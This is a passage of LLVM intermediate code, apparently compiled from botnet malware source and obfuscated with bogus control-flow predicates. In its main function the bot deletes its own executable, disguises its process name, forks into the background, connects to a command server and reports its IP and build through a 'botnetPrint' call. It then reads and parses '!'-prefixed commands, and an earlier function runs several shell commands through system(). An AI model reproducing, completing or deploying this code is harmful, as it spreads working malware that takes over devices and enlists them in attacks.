  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.322, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.323, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.324, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.325, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.326, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.327, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.328, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.109
  %4 = load i32, i32* @y.110
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca [32 x i8], align 16
  %15 = alloca [32 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca [4096 x i8], align 16
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [10 x i8*], align 16
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  %33 = load i8**, i8*** %13, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @unlink(i8* %35) #3
  call void @rand_init()
  %37 = call i32 @rand_next()
  %38 = urem i32 %37, 4
  %39 = add i32 %38, 3
  %40 = mul i32 %39, 4
  store i32 %40, i32* %16, align 4
  %41 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %42 = load i32, i32* %16, align 4
  call void @rand_alphastr(i8* %41, i32 %42)
  %43 = load i32, i32* %16, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 %44
  store i8 0, i8* %45, align 1
  %46 = load i8**, i8*** %13, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %50 = call i32 @util_strcpy(i8* %48, i8* %49)
  %51 = call i32 @rand_next()
  %52 = urem i32 %51, 6
  %53 = add i32 %52, 3
  %54 = mul i32 %53, 4
  store i32 %54, i32* %16, align 4
  %55 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %56 = load i32, i32* %16, align 4
  call void @rand_alphastr(i8* %55, i32 %56)
  %57 = load i32, i32* %16, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 %58
  store i8 0, i8* %59, align 1
  %60 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %61 = call i32 (i32, ...) @prctl(i32 15, i8* %60) #3
  %62 = call i64 @time(i64* null) #3
  %63 = call i32 @getpid() #3
  %64 = sext i32 %63 to i64
  %65 = xor i64 %62, %64
  %66 = trunc i64 %65 to i32
  call void @srand(i32 %66) #3
  call void @rand_init()
  %67 = call i32 @getOurIP()
  %68 = call i32 @fork() #3
  store i32 %68, i32* %17, align 4
  %69 = icmp ne i32 %68, 0
  %70 = load i32, i32* @x.109
  %71 = load i32, i32* @y.110
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %69, label %78, label %97

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load i32, i32* @x.109
  %80 = load i32, i32* @y.110
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %78
  %87 = load i32, i32* %17, align 4
  %88 = call i32 @waitpid(i32 %87, i32* %19, i32 0)
  call void @exit(i32 0) #11
  %89 = load i32, i32* @x.109
  %90 = load i32, i32* @y.110
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  unreachable

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* %17, align 4
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %175, label %100

; <label>:100:                                    ; preds = %97
  %101 = call i32 @fork() #3
  store i32 %101, i32* %18, align 4
  %102 = icmp ne i32 %101, 0
  br i1 %102, label %103, label %120

; <label>:103:                                    ; preds = %100
  %104 = load i32, i32* @x.109
  %105 = load i32, i32* @y.110
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %103
  call void @exit(i32 0) #11
  %112 = load i32, i32* @x.109
  %113 = load i32, i32* @y.110
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  unreachable

; <label>:120:                                    ; preds = %100
  %121 = load i32, i32* %18, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %140, label %123

; <label>:123:                                    ; preds = %120
  %124 = load i32, i32* @x.109
  %125 = load i32, i32* @y.110
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %123
  %132 = load i32, i32* @x.109
  %133 = load i32, i32* @y.110
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %157

; <label>:140:                                    ; preds = %120
  %141 = load i32, i32* @x.109
  %142 = load i32, i32* @y.110
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %140
  %149 = load i32, i32* @x.109
  %150 = load i32, i32* @y.110
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %157

; <label>:157:                                    ; preds = %originalBBpart261, %originalBBpart257
  br label %158

; <label>:158:                                    ; preds = %157
  %159 = load i32, i32* @x.109
  %160 = load i32, i32* @y.110
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %158
  %167 = load i32, i32* @x.109
  %168 = load i32, i32* @y.110
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %176

; <label>:175:                                    ; preds = %97
  br label %176

; <label>:176:                                    ; preds = %175, %originalBBpart265
  %177 = load i32, i32* @x.109
  %178 = load i32, i32* @y.110
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %176
  %185 = load i32, i32* @x.109
  %186 = load i32, i32* @y.110
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %193

; <label>:193:                                    ; preds = %originalBBpart269
  %194 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.329, i32 0, i32 0)) #3
  %195 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  br label %196

; <label>:196:                                    ; preds = %originalBBpart2162, %199, %193
  %197 = call i32 @initConnection()
  %198 = icmp ne i32 %197, 0
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %196
  br label %196

; <label>:200:                                    ; preds = %196
  %201 = load i32, i32* @x.109
  %202 = load i32, i32* @y.110
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %200
  %209 = load i32, i32* @KadenCommStock, align 4
  %210 = call i8* @getBuildz()
  %211 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %212 = call i8* @inet_ntoa(i32 %211) #3
  %213 = call i8* @getBuild()
  %214 = call i32 @getEndianness()
  %215 = call i32 (i32, i8*, ...) @botnetPrint(i32 %209, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.330, i32 0, i32 0), i8* %210, i8* %212, i8* %213, i32 %214, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.331, i32 0, i32 0))
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %21, align 4
  store i32 0, i32* %22, align 4
  %216 = load i32, i32* @x.109
  %217 = load i32, i32* @y.110
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %224

; <label>:224:                                    ; preds = %690, %417, %originalBBpart273
  %225 = load i32, i32* @KadenCommStock, align 4
  %226 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  %227 = call i32 @recvLine(i32 %225, i8* %226, i32 4096)
  store i32 %227, i32* %21, align 4
  %228 = icmp ne i32 %227, -1
  br i1 %228, label %229, label %691

; <label>:229:                                    ; preds = %224
  store i32 0, i32* %22, align 4
  br label %230

; <label>:230:                                    ; preds = %originalBBpart289, %229
  %231 = load i32, i32* %22, align 4
  %232 = sext i32 %231 to i64
  %233 = load i64, i64* @numpids, align 8
  %234 = icmp ult i64 %232, %233
  br i1 %234, label %235, label %352

; <label>:235:                                    ; preds = %230
  %236 = load i32, i32* @x.109
  %237 = load i32, i32* @y.110
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %235
  %244 = load i32*, i32** @pids, align 8
  %245 = load i32, i32* %22, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds i32, i32* %244, i64 %246
  %248 = load i32, i32* %247, align 4
  %249 = call i32 @waitpid(i32 %248, i32* null, i32 1)
  %250 = icmp sgt i32 %249, 0
  %251 = load i32, i32* @x.109
  %252 = load i32, i32* @y.110
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %250, label %259, label %332

; <label>:259:                                    ; preds = %originalBBpart277
  %260 = load i32, i32* %22, align 4
  %261 = add nsw i32 %260, 1
  store i32 %261, i32* %24, align 4
  br label %262

; <label>:262:                                    ; preds = %278, %259
  %263 = load i32, i32* %24, align 4
  %264 = zext i32 %263 to i64
  %265 = load i64, i64* @numpids, align 8
  %266 = icmp ult i64 %264, %265
  br i1 %266, label %267, label %281

; <label>:267:                                    ; preds = %262
  %268 = load i32*, i32** @pids, align 8
  %269 = load i32, i32* %24, align 4
  %270 = zext i32 %269 to i64
  %271 = getelementptr inbounds i32, i32* %268, i64 %270
  %272 = load i32, i32* %271, align 4
  %273 = load i32*, i32** @pids, align 8
  %274 = load i32, i32* %24, align 4
  %275 = sub i32 %274, 1
  %276 = zext i32 %275 to i64
  %277 = getelementptr inbounds i32, i32* %273, i64 %276
  store i32 %272, i32* %277, align 4
  br label %278

; <label>:278:                                    ; preds = %267
  %279 = load i32, i32* %24, align 4
  %280 = add i32 %279, 1
  store i32 %280, i32* %24, align 4
  br label %262

; <label>:281:                                    ; preds = %262
  %282 = load i32*, i32** @pids, align 8
  %283 = load i32, i32* %24, align 4
  %284 = sub i32 %283, 1
  %285 = zext i32 %284 to i64
  %286 = getelementptr inbounds i32, i32* %282, i64 %285
  store i32 0, i32* %286, align 4
  %287 = load i64, i64* @numpids, align 8
  %288 = add i64 %287, -1
  store i64 %288, i64* @numpids, align 8
  %289 = load i64, i64* @numpids, align 8
  %290 = add i64 %289, 1
  %291 = mul i64 %290, 4
  %292 = call noalias i8* @malloc(i64 %291) #3
  %293 = bitcast i8* %292 to i32*
  store i32* %293, i32** %23, align 8
  store i32 0, i32* %24, align 4
  br label %294

; <label>:294:                                    ; preds = %309, %281
  %295 = load i32, i32* %24, align 4
  %296 = zext i32 %295 to i64
  %297 = load i64, i64* @numpids, align 8
  %298 = icmp ult i64 %296, %297
  br i1 %298, label %299, label %312

; <label>:299:                                    ; preds = %294
  %300 = load i32*, i32** @pids, align 8
  %301 = load i32, i32* %24, align 4
  %302 = zext i32 %301 to i64
  %303 = getelementptr inbounds i32, i32* %300, i64 %302
  %304 = load i32, i32* %303, align 4
  %305 = load i32*, i32** %23, align 8
  %306 = load i32, i32* %24, align 4
  %307 = zext i32 %306 to i64
  %308 = getelementptr inbounds i32, i32* %305, i64 %307
  store i32 %304, i32* %308, align 4
  br label %309

; <label>:309:                                    ; preds = %299
  %310 = load i32, i32* %24, align 4
  %311 = add i32 %310, 1
  store i32 %311, i32* %24, align 4
  br label %294

; <label>:312:                                    ; preds = %294
  %313 = load i32, i32* @x.109
  %314 = load i32, i32* @y.110
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %312
  %321 = load i32*, i32** @pids, align 8
  %322 = bitcast i32* %321 to i8*
  call void @free(i8* %322) #3
  %323 = load i32*, i32** %23, align 8
  store i32* %323, i32** @pids, align 8
  %324 = load i32, i32* @x.109
  %325 = load i32, i32* @y.110
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %332

; <label>:332:                                    ; preds = %originalBBpart281, %originalBBpart277
  br label %333

; <label>:333:                                    ; preds = %332
  %334 = load i32, i32* @x.109
  %335 = load i32, i32* @y.110
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %333
  %342 = load i32, i32* %22, align 4
  %343 = add nsw i32 %342, 1
  store i32 %343, i32* %22, align 4
  %344 = load i32, i32* @x.109
  %345 = load i32, i32* @y.110
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart289, label %originalBB83alteredBB

originalBBpart289:                                ; preds = %originalBB83
  br label %230

; <label>:352:                                    ; preds = %230
  %353 = load i32, i32* @x.109
  %354 = load i32, i32* @y.110
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %352
  %361 = load i32, i32* %21, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i64 0, i64 %362
  store i8 0, i8* %363, align 1
  %364 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  call void @trim(i8* %364)
  %365 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  store i8* %365, i8** %25, align 8
  %366 = load i8*, i8** %25, align 8
  %367 = load i8, i8* %366, align 1
  %368 = zext i8 %367 to i32
  %369 = icmp eq i32 %368, 33
  %370 = load i32, i32* @x.109
  %371 = load i32, i32* @y.110
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br i1 %369, label %378, label %690

; <label>:378:                                    ; preds = %originalBBpart293
  %379 = load i8*, i8** %25, align 8
  %380 = getelementptr inbounds i8, i8* %379, i64 1
  store i8* %380, i8** %26, align 8
  br label %381

; <label>:381:                                    ; preds = %409, %378
  %382 = load i8*, i8** %26, align 8
  %383 = load i8, i8* %382, align 1
  %384 = zext i8 %383 to i32
  %385 = icmp ne i32 %384, 32
  br i1 %385, label %386, label %391

; <label>:386:                                    ; preds = %381
  %387 = load i8*, i8** %26, align 8
  %388 = load i8, i8* %387, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp ne i32 %389, 0
  br label %391

; <label>:391:                                    ; preds = %386, %381
  %392 = phi i1 [ false, %381 ], [ %390, %386 ]
  %393 = load i32, i32* @x.109
  %394 = load i32, i32* @y.110
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %391
  %401 = load i32, i32* @x.109
  %402 = load i32, i32* @y.110
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br i1 %392, label %409, label %412

; <label>:409:                                    ; preds = %originalBBpart297
  %410 = load i8*, i8** %26, align 8
  %411 = getelementptr inbounds i8, i8* %410, i32 1
  store i8* %411, i8** %26, align 8
  br label %381

; <label>:412:                                    ; preds = %originalBBpart297
  %413 = load i8*, i8** %26, align 8
  %414 = load i8, i8* %413, align 1
  %415 = zext i8 %414 to i32
  %416 = icmp eq i32 %415, 0
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %412
  br label %224

; <label>:418:                                    ; preds = %412
  %419 = load i32, i32* @x.109
  %420 = load i32, i32* @y.110
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %418
  %427 = load i8*, i8** %26, align 8
  store i8 0, i8* %427, align 1
  %428 = load i8*, i8** %25, align 8
  %429 = getelementptr inbounds i8, i8* %428, i64 1
  store i8* %429, i8** %26, align 8
  %430 = load i8*, i8** %25, align 8
  %431 = load i8*, i8** %26, align 8
  %432 = call i64 @strlen(i8* %431) #9
  %433 = getelementptr inbounds i8, i8* %430, i64 %432
  %434 = getelementptr inbounds i8, i8* %433, i64 2
  store i8* %434, i8** %25, align 8
  %435 = load i32, i32* @x.109
  %436 = load i32, i32* @y.110
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %443

; <label>:443:                                    ; preds = %463, %originalBBpart2101
  %444 = load i8*, i8** %25, align 8
  %445 = load i8*, i8** %25, align 8
  %446 = call i64 @strlen(i8* %445) #9
  %447 = sub i64 %446, 1
  %448 = getelementptr inbounds i8, i8* %444, i64 %447
  %449 = load i8, i8* %448, align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 10
  br i1 %451, label %461, label %452

; <label>:452:                                    ; preds = %443
  %453 = load i8*, i8** %25, align 8
  %454 = load i8*, i8** %25, align 8
  %455 = call i64 @strlen(i8* %454) #9
  %456 = sub i64 %455, 1
  %457 = getelementptr inbounds i8, i8* %453, i64 %456
  %458 = load i8, i8* %457, align 1
  %459 = zext i8 %458 to i32
  %460 = icmp eq i32 %459, 13
  br label %461

; <label>:461:                                    ; preds = %452, %443
  %462 = phi i1 [ true, %443 ], [ %460, %452 ]
  br i1 %462, label %463, label %469

; <label>:463:                                    ; preds = %461
  %464 = load i8*, i8** %25, align 8
  %465 = load i8*, i8** %25, align 8
  %466 = call i64 @strlen(i8* %465) #9
  %467 = sub i64 %466, 1
  %468 = getelementptr inbounds i8, i8* %464, i64 %467
  store i8 0, i8* %468, align 1
  br label %443

; <label>:469:                                    ; preds = %461
  %470 = load i8*, i8** %25, align 8
  store i8* %470, i8** %27, align 8
  br label %471

; <label>:471:                                    ; preds = %originalBBpart2117, %469
  %472 = load i32, i32* @x.109
  %473 = load i32, i32* @y.110
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %471
  %480 = load i8*, i8** %25, align 8
  %481 = load i8, i8* %480, align 1
  %482 = zext i8 %481 to i32
  %483 = icmp ne i32 %482, 32
  %484 = load i32, i32* @x.109
  %485 = load i32, i32* @y.110
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br i1 %483, label %492, label %513

; <label>:492:                                    ; preds = %originalBBpart2105
  %493 = load i32, i32* @x.109
  %494 = load i32, i32* @y.110
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %492
  %501 = load i8*, i8** %25, align 8
  %502 = load i8, i8* %501, align 1
  %503 = zext i8 %502 to i32
  %504 = icmp ne i32 %503, 0
  %505 = load i32, i32* @x.109
  %506 = load i32, i32* @y.110
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %513

; <label>:513:                                    ; preds = %originalBBpart2109, %originalBBpart2105
  %514 = phi i1 [ false, %originalBBpart2105 ], [ %504, %originalBBpart2109 ]
  %515 = load i32, i32* @x.109
  %516 = load i32, i32* @y.110
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %513
  %523 = load i32, i32* @x.109
  %524 = load i32, i32* @y.110
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %514, label %531, label %550

; <label>:531:                                    ; preds = %originalBBpart2113
  %532 = load i32, i32* @x.109
  %533 = load i32, i32* @y.110
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %531
  %540 = load i8*, i8** %25, align 8
  %541 = getelementptr inbounds i8, i8* %540, i32 1
  store i8* %541, i8** %25, align 8
  %542 = load i32, i32* @x.109
  %543 = load i32, i32* @y.110
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br label %471

; <label>:550:                                    ; preds = %originalBBpart2113
  %551 = load i32, i32* @x.109
  %552 = load i32, i32* @y.110
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %550
  %559 = load i8*, i8** %25, align 8
  store i8 0, i8* %559, align 1
  %560 = load i8*, i8** %25, align 8
  %561 = getelementptr inbounds i8, i8* %560, i32 1
  store i8* %561, i8** %25, align 8
  %562 = load i8*, i8** %27, align 8
  store i8* %562, i8** %28, align 8
  %563 = load i32, i32* @x.109
  %564 = load i32, i32* @y.110
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %571

; <label>:571:                                    ; preds = %575, %originalBBpart2121
  %572 = load i8*, i8** %28, align 8
  %573 = load i8, i8* %572, align 1
  %574 = icmp ne i8 %573, 0
  br i1 %574, label %575, label %584

; <label>:575:                                    ; preds = %571
  %576 = load i8*, i8** %28, align 8
